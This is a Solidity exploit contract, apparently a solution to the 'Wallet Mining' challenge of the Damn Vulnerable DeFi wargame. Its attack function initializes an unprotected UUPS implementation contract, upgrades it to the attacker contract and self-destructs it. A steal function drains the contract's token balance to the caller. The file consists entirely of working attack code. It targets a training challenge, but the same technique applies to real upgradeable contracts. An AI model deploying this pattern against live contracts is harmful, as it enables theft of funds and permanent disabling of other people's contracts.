pragma solidity ^0.8.0;

import "./AuthorizerUpgradeable.sol";
import "./WalletDeployer.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


contract AttackerWalletMining is UUPSUpgradeable {
    AuthorizerUpgradeable authorizer;
    WalletDeployer deployer;
    DamnValuableToken token;


    modifier onlyAuthorizer {
        require(msg.sender == address(authorizer));
        _;
    }

    function destruct() external {
        selfdestruct(payable(address(0)));
    }

    constructor (AuthorizerUpgradeable authorizer_, WalletDeployer deployer_, DamnValuableToken token_) {
        authorizer = authorizer_;
        deployer = deployer_;
        token = token_;
    }

    function steal(DamnValuableToken token_) external {
        token_.transfer(msg.sender, token_.balanceOf(address(this)));
    }

    function attack(AuthorizerUpgradeable implementation) external {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(0);
        aims[0] = address(0);
        implementation.init(wards, aims);
        implementation.upgradeToAndCall(address(this), 
                                abi.encodeWithSignature("destruct()"));
    }

    function _authorizeUpgrade(address imp) internal override {}
}